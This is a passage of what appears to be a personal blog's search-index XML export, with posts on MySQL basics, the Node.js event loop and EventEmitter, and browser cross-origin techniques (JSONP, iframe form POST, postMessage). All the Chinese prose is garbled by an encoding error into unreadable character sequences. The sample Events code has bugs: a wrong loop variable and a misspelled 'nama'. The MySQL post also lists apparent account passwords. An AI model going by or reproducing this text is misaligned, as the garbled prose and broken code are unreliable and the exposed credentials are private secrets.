    <content type="text"><![CDATA[å‰è¨€ MySQLæ“ä½œä¸€è§ˆ BY widä¸€ã€æ¦‚å¿µ SQLå³ä¸ºStructured Query Language(ç»“æž„åŒ–æŸ¥è¯¢è¯­è¨€) MySQL ä¸ºå…³ç³»åž‹æ•°æ®åº“(Relational Database Management System), è¿™ç§æ‰€è°“çš„â€å…³ç³»åž‹â€å¯ä»¥ç†è§£ä¸ºâ€è¡¨æ ¼â€çš„æ¦‚å¿µ, ä¸€ä¸ªå…³ç³»åž‹æ•°æ®åº“ç”±ä¸€ä¸ªæˆ–æ•°ä¸ªè¡¨æ ¼ç»„æˆ, å¦‚å›¾æ‰€ç¤ºçš„ä¸€ä¸ªè¡¨æ ¼: è¡¨å¤´(header): æ¯ä¸€åˆ—çš„åç§°; åˆ—(column): å…·æœ‰ç›¸åŒæ•°æ®ç±»åž‹çš„æ•°æ®çš„é›†åˆ; è¡Œ(row): æ¯ä¸€è¡Œç”¨æ¥æè¿°æŸä¸ªäºº/ç‰©çš„å…·ä½“ä¿¡æ¯; å€¼(value): è¡Œçš„å…·ä½“ä¿¡æ¯,æ¯ä¸ªå€¼å¿…é¡»ä¸Žè¯¥åˆ—çš„æ•°æ®ç±»åž‹ç›¸åŒ; é”®(key): è¡¨ä¸­ç”¨æ¥è¯†åˆ«æŸä¸ªç‰¹å®šçš„äºº\ç‰©çš„æ–¹æ³•,é”®çš„å€¼åœ¨å½“å‰åˆ—ä¸­å…·æœ‰å”¯ä¸€æ€§ã€‚ä¸€ã€å®‰è£…ä¿¡æ¯é…ç½®çš„ç«¯å£ï¼š3306 ç”¨æˆ·ï¼šRoot:539450;CatcherInSky:zxc123 Windows Service Name: MySQL57 æœåŠ¡ï¼šæŽ§åˆ¶é¢æ¿-&gt;ç³»ç»Ÿä¸Žå®‰å…¨-&gt;ç®¡ç†å·¥å…·-&gt;æœåŠ¡ å¯åœç”¨ã€é‡å¯ä¸Žå¸è½½MySQLæœåŠ¡ è·¯å¾„ï¼šC:\Program Files\MySQL\MySQL Server 5.7\bin äºŒã€åŸºç¡€æ“ä½œ1.ç”¨æˆ·è¡Œä¸º 2.1.1.ç™»å½•cmdè¿›å…¥å®‰è£…è·¯å¾„ï¼Œè¾“å…¥ mysql -D æ•°æ®åº“å -h ä¸»æœºå -u ç”¨æˆ·å -pï¼› 2.åº“çš„æ“ä½œ 2.2.1åˆ›å»ºæ•°æ®åº“ create database æ•°æ®åº“å å…¶å®ƒé€‰é¡¹ï¼› 2.2.2æŸ¥çœ‹æ•°æ®åº“ show databasesï¼› 2.2.3ç™»å½•æ•°æ®åº“ use æ•°æ®åº“åï¼ˆåº“å£°æ˜Žï¼‰; å£°æ˜Žå¦‚ï¼š character set gbk å¯å°†æ•°æ®åº“å­—ç¬¦ç¼–ç æŒ‡å®šä¸º gbk 2.2.4åˆ é™¤æ•°æ®åº“ drop database æ•°æ®åº“å; .è¡¨çš„æ“ä½œ 2.3.1åˆ›å»ºæ•°æ®åº“è¡¨ create table è¡¨åç§°(åˆ—å£°æ˜Ž); å¯¹äºŽä¸€äº›è¾ƒé•¿çš„è¯­å¥åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹å¯èƒ½å®¹æ˜“è¾“é”™,å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»»ä½•æ–‡æœ¬ç¼–è¾‘å™¨å°†è¯­å¥è¾“å…¥å¥½åŽä¿å­˜ä¸º createtable.sql çš„æ–‡ä»¶ä¸­, é€šè¿‡å‘½ä»¤æç¤ºç¬¦ä¸‹çš„æ–‡ä»¶é‡å®šå‘æ‰§è¡Œæ‰§è¡Œè¯¥è„šæœ¬ã€‚ mysql -D samp_db -u root -p &lt; createtable.sqlï¼› (æç¤º: 1.å¦‚æžœè¿žæŽ¥è¿œç¨‹ä¸»æœºè¯·åŠ ä¸Š -h æŒ‡ä»¤; 2. è¯¥æ–‡ä»¶è‹¥ä¸åœ¨å½“å‰å·¥ä½œç›®å½•ä¸‹éœ€æŒ‡å®šæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚) åˆ—å£°æ˜Žé¦–é¡¹ä¸ºåˆ—çš„åç§°åŽé¢ä¸ºæ•°æ®ç±»åž‹æè¿°ã€‚ 2.3.2æŸ¥çœ‹æ•°æ®åº“è¡¨ æŸ¥çœ‹æ‰€æœ‰è¡¨åç§° show tables; æŸ¥çœ‹æŸä¸ªè¡¨çš„è¯¦ç»†ä¿¡æ¯ describe è¡¨å; 2.3.4åˆ é™¤æ•°æ®åº“è¡¨ drop table è¡¨å; 2.3.5é‡å‘½åæ•°æ®åº“è¡¨ alter table è¡¨å rename æ–°è¡¨å; 2.3.6ä¿®æ”¹æ•°æ®åº“è¡¨alter table è¯­å¥ç”¨äºŽåˆ›å»ºåŽå¯¹è¡¨çš„ä¿®æ”¹, åŸºç¡€ç”¨æ³•å¦‚ä¸‹: 2.3.6.1æ·»åŠ åˆ— alter table è¡¨å add åˆ—å åˆ—æ•°æ®ç±»åž‹ [after æ’å…¥ä½ç½®]; ç¤ºä¾‹:åœ¨è¡¨çš„æœ€åŽè¿½åŠ åˆ— address: alter table students add address char(60); ç¤ºä¾‹ï¼šåœ¨åä¸º age çš„åˆ—åŽæ’å…¥åˆ— birthday: alter table students add birthday date after age; 2.3.6.2ä¿®æ”¹åˆ— alter table è¡¨å change åˆ—åç§° åˆ—æ–°åç§° æ–°æ•°æ®ç±»åž‹; ç¤ºä¾‹ï¼šå°†è¡¨ tel åˆ—æ”¹åä¸º telphone alter table students change tel telphone char(13) default â€œ-â€œ; ç¤ºä¾‹ï¼šå°† name åˆ—çš„æ•°æ®ç±»åž‹æ”¹ä¸º char(16) alter table students change name name char(16) not null; 2.3.6.3åˆ é™¤åˆ— alter table è¡¨å drop åˆ—åç§°; ç¤ºä¾‹:åˆ é™¤ birthday åˆ—: alter table students drop birthday; 4.å€¼çš„æ“ä½œ 2.4.1æ’å…¥æ•°æ® insert [into] è¡¨å [(åˆ—å1, åˆ—å2, â€¦)] values (å€¼1, å€¼2, â€¦); ä»Žç¬¬ä¸€åˆ—æ•°æ®å¼€å§‹å†™å…¨éƒ¨æ•°æ® insert into students values(NULL, â€œçŽ‹åˆšâ€, â€œç”·â€, 20,â€13811371377â€); ä»ŽæŸåˆ—å¼€å§‹å†™éƒ¨åˆ†æ•°æ® insert into students (name, sex, age) values(â€œå­™ä¸½åŽâ€, â€œå¥³â€, 21); 2.4.2æŸ¥è¯¢è¡¨ä¸­çš„æ•°æ® select åˆ—åç§° from è¡¨åç§° where ç‰¹å®šæ¡ä»¶; ä¹Ÿå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ * æŸ¥è¯¢è¡¨ä¸­æ‰€æœ‰çš„å†…å®¹ã€‚where å­å¥ä¸ä»…ä»…æ”¯æŒ â€œwhere åˆ—å = å€¼â€ è¿™ç§åç­‰äºŽå€¼çš„æŸ¥è¯¢å½¢å¼,å¯¹ä¸€èˆ¬çš„æ¯”è¾ƒè¿ç®—çš„è¿ç®—ç¬¦éƒ½æ˜¯æ”¯æŒçš„, ä¾‹å¦‚ =ã€&gt;ã€&lt;ã€&gt;=ã€&lt;ã€!=ä»¥åŠä¸€äº›æ‰©å±•è¿ç®—ç¬¦ is [not] nullã€inã€like ç­‰ç­‰ã€‚ è¿˜å¯ä»¥å¯¹æŸ¥è¯¢æ¡ä»¶ä½¿ç”¨ or å’Œ and è¿›è¡Œç»„åˆæŸ¥è¯¢ ç¤ºä¾‹:æŸ¥è¯¢å¹´é¾„åœ¨21å²ä»¥ä¸Šçš„æ‰€æœ‰äººä¿¡æ¯: select * from students where age &gt; 21; ç¤ºä¾‹:æŸ¥è¯¢åå­—ä¸­å¸¦æœ‰ â€œçŽ‹â€ å­—çš„æ‰€æœ‰äººä¿¡æ¯: select * from students where name like â€œ%çŽ‹%â€; ç¤ºä¾‹:æŸ¥è¯¢idå°äºŽ5ä¸”å¹´é¾„å¤§äºŽ20çš„æ‰€æœ‰äººä¿¡æ¯: select * from students where id20; 2.4.3æ›´æ–°è¡¨ä¸­çš„æ•°æ® update è¡¨åç§° set åˆ—åç§°=æ–°å€¼ æ›´æ–°æ¡ä»¶; 2.4.4åˆ é™¤è¡¨ä¸­æ•°æ® delete from è¡¨åç§° where åˆ é™¤æ¡ä»¶; ä¸åŠ æ¡ä»¶åˆ é™¤æ‰€æœ‰æ•°æ®]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>DataBase</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node.js]]></title>
    <url>%2F2019%2F02%2F23%2FNodejs%2F</url>
    <content type="text"><![CDATA[å‰è¨€ Node ä¸­çš„ Event Loop å’Œæµè§ˆå™¨ä¸­çš„æ˜¯å®Œå…¨ä¸ç›¸åŒçš„ä¸œè¥¿ã€‚Node.js é‡‡ç”¨ V8 ä½œä¸º js çš„è§£æžå¼•æ“Žï¼Œè€Œ I/O å¤„ç†æ–¹é¢ä½¿ç”¨äº†è‡ªå·±è®¾è®¡çš„ libuvï¼Œlibuv æ˜¯ä¸€ä¸ªåŸºäºŽäº‹ä»¶é©±åŠ¨çš„è·¨å¹³å°æŠ½è±¡å±‚ï¼Œå°è£…äº†ä¸åŒæ“ä½œç³»ç»Ÿä¸€äº›åº•å±‚ç‰¹æ€§ï¼Œå¯¹å¤–æä¾›ç»Ÿä¸€çš„ APIï¼Œäº‹ä»¶å¾ªçŽ¯æœºåˆ¶ä¹Ÿæ˜¯å®ƒé‡Œé¢çš„å®žçŽ° è½®è¯¢æœºåˆ¶é€šè¿‡libuvåº“å®žçŽ° uv_runå‡½æ•°åˆ†ä¸ºå…­ä¸ªé˜¶æ®µ timers å®šæ—¶å™¨é˜¶æ®µè®¡æ—¶å’Œæ‰§è¡Œåˆ°ç‚¹çš„å®šæ—¶å™¨å›žè°ƒå‡½æ•° pending callbacksæŸäº›ç³»ç»Ÿæ“ä½œï¼ˆå¦‚TCPé”™è¯¯ç±»åž‹ï¼‰çš„å›žè°ƒå‡½æ•° idle.prepareå‡†å¤‡å·¥ä½œ poll è½®è¯¢é˜¶æ®µå¦‚æžœè½®è¯¢é˜Ÿåˆ—ä¸ä¸ºç©ºï¼Œä¾æ¬¡åŒæ­¥å–å‡ºè½®è¯¢é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªå›žè°ƒå‡½æ•°æ‰§è¡Œï¼Œç›´åˆ°è½®è¯¢é˜Ÿåˆ—ä¸ºç©ºæˆ–è¾¾åˆ°ç³»ç»Ÿæœ€å¤§é™åˆ¶ï¼›å¦‚æžœè½®è¯¢é˜Ÿåˆ—ä¸ºç©ºï¼šå¦‚æžœæœ‰setImmediateï¼Œç›´æŽ¥è¿›å…¥ä¸‹ä¸ªchecké˜¶æ®µï¼› å¦‚æžœæ²¡æœ‰å°±åœ¨pollé˜¶æ®µç­‰å¾…ï¼Œç›´åˆ°è½®è¯¢é˜Ÿåˆ—æ·»åŠ äº†æ–°çš„å›žè°ƒå‡½æ•°æˆ–è€…å®šæ—¶å™¨åˆ°ç‚¹å°±åŽ»ä¸‹ä¸ªchecké˜¶æ®µï¼› checkæ‰§è¡ŒsetImmediateè®¾ç½®çš„å›žè°ƒå‡½æ•° close/callbacks å…³é—­é˜¶æ®µæ‰§è¡Œcloseäº‹ä»¶å›žè°ƒå‡½æ•° process.nextTickè¿™ä¸ªå‡½æ•°å…¶å®žæ˜¯ç‹¬ç«‹äºŽ Event Loop ä¹‹å¤–çš„ï¼Œå®ƒæœ‰ä¸€ä¸ªè‡ªå·±çš„é˜Ÿåˆ—ï¼Œå½“æ¯ä¸ªé˜¶æ®µå®ŒæˆåŽï¼Œå¦‚æžœå­˜åœ¨ nextTick é˜Ÿåˆ—ï¼Œå°±ä¼šæ¸…ç©ºé˜Ÿåˆ—ä¸­çš„æ‰€æœ‰å›žè°ƒå‡½æ•°ï¼Œå¹¶ä¸”ä¼˜å…ˆäºŽå…¶ä»– microtask æ‰§è¡Œã€‚ å¤–éƒ¨è¾“å…¥æ•°æ®â€“&gt;è½®è¯¢é˜¶æ®µ(poll)â€“&gt;æ£€æŸ¥é˜¶æ®µ(check)â€“&gt;å…³é—­äº‹ä»¶å›žè°ƒé˜¶æ®µ(close callback)â€“&gt;å®šæ—¶å™¨æ£€æµ‹é˜¶æ®µ(timer)â€“&gt;I/O äº‹ä»¶å›žè°ƒé˜¶æ®µ(I/O callbacks)â€“&gt;é—²ç½®é˜¶æ®µ(idle, prepare) timers é˜¶æ®µï¼šè¿™ä¸ªé˜¶æ®µæ‰§è¡Œ timerï¼ˆsetTimeoutã€setIntervalï¼‰çš„å›žè°ƒ I/O callbacks é˜¶æ®µï¼šå¤„ç†ä¸€äº›ä¸Šä¸€è½®å¾ªçŽ¯ä¸­çš„å°‘æ•°æœªæ‰§è¡Œçš„ I/O å›žè°ƒ idle, prepare é˜¶æ®µï¼šä»… node å†…éƒ¨ä½¿ç”¨ poll é˜¶æ®µï¼šèŽ·å–æ–°çš„ I/O äº‹ä»¶, é€‚å½“çš„æ¡ä»¶ä¸‹ node å°†é˜»å¡žåœ¨è¿™é‡Œ check é˜¶æ®µï¼šæ‰§è¡Œ setImmediate() çš„å›žè°ƒ close callbacks é˜¶æ®µï¼šæ‰§è¡Œ socket çš„ close äº‹ä»¶å›žè°ƒ æ—¥å¸¸å¼€å‘ä¸­çš„ç»å¤§éƒ¨åˆ†å¼‚æ­¥ä»»åŠ¡éƒ½æ˜¯åœ¨timersã€pollã€check`è¿™ 3 ä¸ªé˜¶æ®µå¤„ç†çš„ã€‚ (1) timer timers é˜¶æ®µä¼šæ‰§è¡Œ setTimeout å’Œ setInterval å›žè°ƒï¼Œå¹¶ä¸”æ˜¯ç”± poll é˜¶æ®µæŽ§åˆ¶çš„ã€‚åŒæ ·ï¼Œåœ¨ Node ä¸­å®šæ—¶å™¨æŒ‡å®šçš„æ—¶é—´ä¹Ÿä¸æ˜¯å‡†ç¡®æ—¶é—´ï¼Œåªèƒ½æ˜¯å°½å¿«æ‰§è¡Œã€‚ (2) poll poll æ˜¯ä¸€ä¸ªè‡³å…³é‡è¦çš„é˜¶æ®µï¼Œè¿™ä¸€é˜¶æ®µä¸­ï¼Œç³»ç»Ÿä¼šåšä¸¤ä»¶äº‹æƒ… å›žåˆ° timer é˜¶æ®µæ‰§è¡Œå›žè°ƒ æ‰§è¡Œ I/O å›žè°ƒ å¹¶ä¸”åœ¨è¿›å…¥è¯¥é˜¶æ®µæ—¶å¦‚æžœæ²¡æœ‰è®¾å®šäº† timer çš„è¯ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹ä¸¤ä»¶äº‹æƒ… å¦‚æžœ poll é˜Ÿåˆ—ä¸ä¸ºç©ºï¼Œä¼šéåŽ†å›žè°ƒé˜Ÿåˆ—å¹¶åŒæ­¥æ‰§è¡Œï¼Œç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºæˆ–è€…è¾¾åˆ°ç³»ç»Ÿé™åˆ¶ å¦‚æžœ poll é˜Ÿåˆ—ä¸ºç©ºæ—¶ï¼Œä¼šæœ‰ä¸¤ä»¶äº‹å‘ç”Ÿ å¦‚æžœæœ‰ setImmediate å›žè°ƒéœ€è¦æ‰§è¡Œï¼Œpoll é˜¶æ®µä¼šåœæ­¢å¹¶ä¸”è¿›å…¥åˆ° check é˜¶æ®µæ‰§è¡Œå›žè°ƒ å¦‚æžœæ²¡æœ‰ setImmediate å›žè°ƒéœ€è¦æ‰§è¡Œï¼Œä¼šç­‰å¾…å›žè°ƒè¢«åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­å¹¶ç«‹å³æ‰§è¡Œå›žè°ƒï¼Œè¿™é‡ŒåŒæ ·ä¼šæœ‰ä¸ªè¶…æ—¶æ—¶é—´è®¾ç½®é˜²æ­¢ä¸€ç›´ç­‰å¾…ä¸‹åŽ» å½“ç„¶è®¾å®šäº† timer çš„è¯ä¸” poll é˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™ä¼šåˆ¤æ–­æ˜¯å¦æœ‰ timer è¶…æ—¶ï¼Œå¦‚æžœæœ‰çš„è¯ä¼šå›žåˆ° timer é˜¶æ®µæ‰§è¡Œå›žè°ƒã€‚ (3) check é˜¶æ®µ setImmediate()çš„å›žè°ƒä¼šè¢«åŠ å…¥ check é˜Ÿåˆ—ä¸­ï¼Œä»Ž event loop çš„é˜¶æ®µå›¾å¯ä»¥çŸ¥é“ï¼Œcheck é˜¶æ®µçš„æ‰§è¡Œé¡ºåºåœ¨ poll é˜¶æ®µä¹‹åŽã€‚ æ³¨æ„ setImmediate è®¾è®¡åœ¨ poll é˜¶æ®µå®Œæˆæ—¶æ‰§è¡Œï¼Œå³ check é˜¶æ®µï¼› setTimeout è®¾è®¡åœ¨ poll é˜¶æ®µä¸ºç©ºé—²æ—¶ï¼Œä¸”è®¾å®šæ—¶é—´åˆ°è¾¾åŽæ‰§è¡Œï¼Œä½†å®ƒåœ¨ timer é˜¶æ®µæ‰§è¡Œ ç®€å•å®žçŽ°Nodeçš„Eventsæ¨¡å—å‚è€ƒå›žç­”ï¼šç®€ä»‹ï¼šè§‚å¯Ÿè€…æ¨¡å¼æˆ–è€…è¯´è®¢é˜…æ¨¡å¼ï¼Œå®ƒå®šä¹‰äº†å¯¹è±¡é—´çš„ä¸€ç§ä¸€å¯¹å¤šçš„å…³ç³»ï¼Œè®©å¤šä¸ªè§‚å¯Ÿè€…å¯¹è±¡åŒæ—¶ç›‘å¬æŸä¸€ä¸ªä¸»é¢˜å¯¹è±¡ï¼Œå½“ä¸€ä¸ªå¯¹è±¡å‘ç”Ÿæ”¹å˜æ—¶ï¼Œæ‰€æœ‰ä¾èµ–äºŽå®ƒçš„å¯¹è±¡éƒ½å°†å¾—åˆ°é€šçŸ¥ã€‚ nodeä¸­çš„Eventsæ¨¡å—å°±æ˜¯é€šè¿‡è§‚å¯Ÿè€…æ¨¡å¼æ¥å®žçŽ°çš„ï¼š 123456var events=require(&apos;events&apos;);var eventEmitter=new events.EventEmitter();eventEmitter.on(&apos;say&apos;,function(name)&#123;console.log(&apos;Hello&apos;,name);&#125;)eventEmitter.emit(&apos;say&apos;,&apos;Jony yu&apos;); è¿™æ ·ï¼ŒeventEmitterå‘å‡ºsayäº‹ä»¶ï¼Œé€šè¿‡OnæŽ¥æ”¶ï¼Œå¹¶ä¸”è¾“å‡ºç»“æžœï¼Œè¿™å°±æ˜¯ä¸€ä¸ªè®¢é˜…æ¨¡å¼çš„å®žçŽ°ï¼Œä¸‹é¢æˆ‘ä»¬æ¥ç®€å•çš„å®žçŽ°ä¸€ä¸ªEventsæ¨¡å—çš„EventEmitterã€‚ (1)å®žçŽ°ç®€å•çš„Eventæ¨¡å—çš„emitå’Œonæ–¹æ³• 12345678910111213141516171819function Events()&#123;this.on=function(eventName,callBack)&#123;if(!this.handles)&#123;this.handles=&#123;&#125;;&#125;if(!this.handles[eventName])&#123;this.handles[eventName]=[];&#125;this.handles[eventName].push(callBack);&#125;this.emit=function(eventName,obj)&#123;if(this.handles[eventName])&#123;for(var i=0;o&lt;this.handles[eventName].length;i++)&#123;this.handles[eventName][i](obj);&#125;&#125;&#125;return this;&#125; è¿™æ ·æˆ‘ä»¬å°±å®šä¹‰äº†Eventsï¼ŒçŽ°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹æ¥è°ƒç”¨ï¼š 12345var events=new Events();events.on(&apos;say&apos;,function(name)&#123;console.log(&apos;Hello&apos;,nama)&#125;);events.emit(&apos;say&apos;,&apos;Jony yu&apos;); //ç»“æžœå°±æ˜¯é€šè¿‡emitè°ƒç”¨ä¹‹åŽï¼Œè¾“å‡ºäº†Jony yu (2)æ¯ä¸ªå¯¹è±¡æ˜¯ç‹¬ç«‹çš„ å› ä¸ºæ˜¯é€šè¿‡newçš„æ–¹å¼ï¼Œæ¯æ¬¡ç”Ÿæˆçš„å¯¹è±¡éƒ½æ˜¯ä¸ç›¸åŒçš„ï¼Œå› æ­¤ï¼š 12345678910var event1=new Events();var event2=new Events();event1.on(&apos;say&apos;,function()&#123;console.log(&apos;Jony event1&apos;);&#125;);event2.on(&apos;say&apos;,function()&#123;console.log(&apos;Jony event2&apos;);&#125;)event1.emit(&apos;say&apos;);event2.emit(&apos;say&apos;); //event1ã€event2ä¹‹é—´çš„äº‹ä»¶ç›‘å¬äº’ç›¸ä¸å½±å“ //è¾“å‡ºç»“æžœä¸ºâ€™Jony event1â€™ â€˜Jony event2â€™ https://zhuanlan.zhihu.com/p/54882306]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è·¨åŸŸ]]></title>
    <url>%2F2018%2F12%2F24%2FcrossOrigin%2F</url>
    <content type="text"><![CDATA[å‰è¨€ç®€å•è®°å½•Gitç”¨æ³•ä»¥åšè®°å½• ä»€ä¹ˆæ˜¯è·¨åŸŸåŒæºç­–ç•¥åŒæºæŒ‡ åè®® åŸŸå ç«¯å£ ç›¸åŒä¸ºåŒæºï¼Œå³ä¾¿ä¸¤ä¸ªä¸åŒçš„åŸŸåæŒ‡å‘åŒä¸€ä¸ª ip åœ°å€ï¼Œä¹ŸéžåŒæºã€‚æµè§ˆå™¨çš„åŒæºç­–ç•¥é™åˆ¶äº†ä»ŽåŒä¸€ä¸ªæºåŠ è½½çš„æ–‡æ¡£æˆ–è„šæœ¬å¦‚ä½•ä¸Žæ¥è‡ªå¦ä¸€ä¸ªæºçš„èµ„æºè¿›è¡Œäº¤äº’ã€‚å®ƒæ˜¯æµè§ˆå™¨æœ€æ ¸å¿ƒä¹Ÿæœ€åŸºæœ¬çš„å®‰å…¨åŠŸèƒ½ï¼Œå¦‚æžœç¼ºå°‘äº†åŒæºç­–ç•¥ï¼Œæµè§ˆå™¨å¾ˆå®¹æ˜“å—åˆ° XSSã€CSFR ç­‰æ”»å‡»ã€‚ è§¦å‘è·¨åŸŸé”™è¯¯æµè§ˆå™¨ç«¯çš„é™åˆ¶ï¼ˆæœåŠ¡ç«¯æ”¶åˆ°äº†è¯·æ±‚å¹¶æ­£ç¡®è¿”å›žï¼‰å‘é€çš„æ˜¯ XMLHttpRequest è¯·æ±‚ï¼ˆä½¿ç”¨ img æ ‡ç­¾å‘é€çš„è¯·æ±‚ä¸º json ç±»åž‹ï¼Œå¹¶ä¸ä¼šæŠ¥é”™ï¼‰è¯·æ±‚äº†ä¸åŒåŸŸçš„èµ„æº CSRFæœåŠ¡ç«¯éªŒè¯é€šè¿‡åŽä¼šåœ¨å“åº”å¤´åŠ å…¥Set-Cookieå­—æ®µï¼Œç„¶åŽä¸‹æ¬¡å†å‘è¯·æ±‚çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å°†cookieé™„åŠ åœ¨HTTPè¯·æ±‚çš„å¤´å­—æ®µCookieä¸­ã€‚å¦‚æžœæ²¡æœ‰åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œç›—ç”¨cookieè¿›è¡Œè¯·æ±‚è¿›è¡ŒCSRFæ”»å‡»ã€‚ æ–¹æ³•JSONPJSONPï¼Œæ˜¯ JSON with Padding çš„ç®€ç§°ï¼Œå®ƒæ˜¯ json çš„ä¸€ç§è¡¥å……ä½¿ç”¨æ–¹å¼ï¼Œåˆ©ç”¨ script æ ‡ç­¾æ¥è§£å†³è·¨åŸŸé—®é¢˜ã€‚JSONP æ˜¯éžå®˜æ–¹åè®®ï¼Œä»–åªæ˜¯å‰åŽç«¯ä¸€ä¸ªçº¦å®šï¼Œå¦‚æžœè¯·æ±‚å‚æ•°å¸¦æœ‰çº¦å®šçš„å‚æ•°ï¼Œåˆ™åŽå°è¿”å›ž javascript ä»£ç è€Œéž json æ•°æ®ï¼Œè¿”å›žä»£ç æ˜¯å‡½æ•°è°ƒç”¨å½¢å¼ï¼Œå‡½æ•°åå³çº¦å®šå€¼ï¼Œå‡½æ•°å‚æ•°å³è¦è¿”å›žçš„æ•°æ®ã€‚ é¦–å…ˆåœ¨å®¢æˆ·ç«¯ js ä¸­å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼ˆå‡è®¾åä¸º handlerï¼‰ï¼Œç„¶åŽåŠ¨æ€åˆ›å»ºä¸€ä¸ª script æ ‡ç­¾æ’å…¥é¡µé¢ä¸­ï¼Œscript æ ‡ç­¾çš„ src å±žæ€§å³è¦è°ƒç”¨çš„åœ°å€ï¼ŒåŒæ—¶ï¼Œåœ¨è°ƒç”¨çš„ url ä¸­åŠ å…¥ä¸€ä¸ªæœåŠ¡ç«¯çº¦å®šçš„å‚æ•°ï¼ˆå‡è®¾åä¸º callbackï¼Œå‚æ•°å€¼ä¸ºå·²å®šä¹‰çš„å‡½æ•°å handlerï¼‰ï¼ŒæœåŠ¡ç«¯æ”¶åˆ°è¯·æ±‚ï¼Œå¦‚æžœå‘çŽ°è¯·æ±‚çš„ url ä¸­å¸¦æœ‰çº¦å®šçš„å‚æ•°ï¼Œé‚£ä¹ˆå°±è¿”å›žä¸€æ®µå‡½æ•°è°ƒç”¨å½¢å¼çš„ javascript ä»£ç ï¼Œè¯¥æ®µä»£ç çš„å‡½æ•°åå³ä¸º callback å‚æ•°çš„å€¼ handlerï¼Œå‡½æ•°çš„å‚æ•°å³ä¸ºå¾…è¿”å›žçš„æ•°æ®ã€‚è¿™æ ·ï¼Œå®¢æˆ·ç«¯æ‹¿åˆ°è¿”å›žç»“æžœåŽå°±ä¼šæ‰§è¡Œ handler å‡½æ•°ï¼Œå¯¹è¿”å›žçš„æ•°æ®è¿›è¡Œå¤„ç†ã€‚ å­˜åœ¨ä»¥ä¸‹ç¼ºé™·ï¼š1.åªèƒ½å‘é€ GET è¯·æ±‚2.å‘é€çš„ä¸æ˜¯ XHR è¯·æ±‚ï¼Œè¿™æ ·å¯¼è‡´ XHR è¯·æ±‚ä¸­çš„å¾ˆå¤šäº‹ä»¶éƒ½æ— æ³•è¿›è¡Œå¤„ç†3.æœåŠ¡ç«¯éœ€è¦æ”¹åŠ¨ ## 1234567891011function jsonp(url, callback, success) &#123; var script = document.createElement(&apos;script&apos;); script.src = url; script.async = true; script.type = &apos;text/javascript&apos;; window[callback] = function(data) &#123; success &amp;&amp; success(data); &#125; document.body.appendChild(script);&#125; ### ç©ºiframeåŠ formJSONPåªèƒ½å‘GETè¯·æ±‚ï¼Œå› ä¸ºæœ¬è´¨ä¸ŠscriptåŠ è½½èµ„æºå°±æ˜¯GETï¼Œç”¨è¿™ä¸ªæ–¹æ³•å‘POSTè¯·æ±‚ åŽç«¯å†™ä¸ªå°æŽ¥å£ 12345678910// å¤„ç†æˆåŠŸå¤±è´¥è¿”å›žæ ¼å¼çš„å·¥å…·const &#123;successBody&#125; = require(&apos;../utli&apos;)class CrossDomain &#123; static async iframePost (ctx) &#123; let postData = ctx.request.body console.log(postData) ctx.body = successBody(&#123;postData: postData&#125;, &apos;success&apos;) &#125;&#125;module.exports = CrossDomain å‰ç«¯ 12345678910111213141516171819202122232425262728293031323334353637const requestPost = (&#123;url, data&#125;) =&gt; &#123; // é¦–å…ˆåˆ›å»ºä¸€ä¸ªç”¨æ¥å‘é€æ•°æ®çš„iframe. const iframe = document.createElement(&apos;iframe&apos;) iframe.name = &apos;iframePost&apos; iframe.style.display = &apos;none&apos; document.body.appendChild(iframe) const form = document.createElement(&apos;form&apos;) const node = document.createElement(&apos;input&apos;) // æ³¨å†Œiframeçš„loadäº‹ä»¶å¤„ç†ç¨‹åº,å¦‚æžœä½ éœ€è¦åœ¨å“åº”è¿”å›žæ—¶æ‰§è¡Œä¸€äº›æ“ä½œçš„è¯. iframe.addEventListener(&apos;load&apos;, function () &#123; console.log(&apos;post success&apos;) &#125;) form.action = url // åœ¨æŒ‡å®šçš„iframeä¸­æ‰§è¡Œform form.target = iframe.name form.method = &apos;post&apos; for (let name in data) &#123; node.name = name node.value = data[name].toString() form.appendChild(node.cloneNode()) &#125; // è¡¨å•å…ƒç´ éœ€è¦æ·»åŠ åˆ°ä¸»æ–‡æ¡£ä¸­. form.style.display = &apos;none&apos; document.body.appendChild(form) form.submit() // è¡¨å•æäº¤åŽ,å°±å¯ä»¥åˆ é™¤è¿™ä¸ªè¡¨å•,ä¸å½±å“ä¸‹æ¬¡çš„æ•°æ®å‘é€. document.body.removeChild(form)&#125;// ä½¿ç”¨æ–¹å¼requestPost(&#123; url: &apos;http://localhost:9871/api/iframePost&apos;, data: &#123; msg: &apos;helloIframePost&apos; &#125;&#125;) postMessage è·¨åŸŸpostMessage()æ–¹æ³•å…è®¸æ¥è‡ªä¸åŒæºçš„è„šæœ¬é‡‡ç”¨å¼‚æ­¥æ–¹å¼è¿›è¡Œæœ‰é™çš„é€šä¿¡ï¼Œå¯ä»¥å®žçŽ°è·¨æ–‡æœ¬æ¡£ã€å¤šçª—å£ã€è·¨åŸŸæ¶ˆæ¯ä¼ é€’ã€‚ 123456789101112131415161718192021//æ•èŽ·iframevar domain = "http://scriptandstyle.com";var iframe = document.getElementById("myIFrame").contentWindow;//å‘é€æ¶ˆæ¯setInterval(function() &#123; var message = "Hello! The time is: " + new Date().getTime(); console.log("blog.local: sending message: " + message); //send the message and target URI iframe.postMessage(message, domain);&#125;, 6000);//å“åº”äº‹ä»¶window.addEventListener( "message", function(event) &#123; if (event.origin !== "http://davidwalsh.name") return; console.log("message received: " + event.data, event); event.source.postMessage("holla back youngin!", event.origin); &#125;, false); 